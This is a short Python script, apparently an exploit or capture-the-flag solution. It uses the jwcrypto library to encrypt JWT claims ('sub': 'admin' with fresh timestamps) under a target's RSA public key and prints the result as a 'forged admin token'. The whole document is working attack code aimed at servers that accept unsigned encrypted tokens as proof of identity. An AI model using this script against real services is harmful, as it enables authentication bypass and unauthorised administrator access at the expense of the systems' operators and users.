from jwcrypto import jwk, jwe
import json
import time

public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----"""

key = jwk.JWK.from_pem(public_key_pem)

# The raw JSON claims. Adding standard timestamp claims to bypass strict validation.
now = int(time.time())
claims = {
    "sub": "admin",
    "iat": now,
    "exp": now + 3600 # Expires in 1 hour
}

# Encrypting the JSON bytes directly
payload = json.dumps(claims).encode('utf-8')

protected_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256GCM",
    "cty": "JWT"
}

jwetoken = jwe.JWE(payload, recipient=key, protected=protected_header)

print("Your new forged admin token:")
print(jwetoken.serialize(compact=True))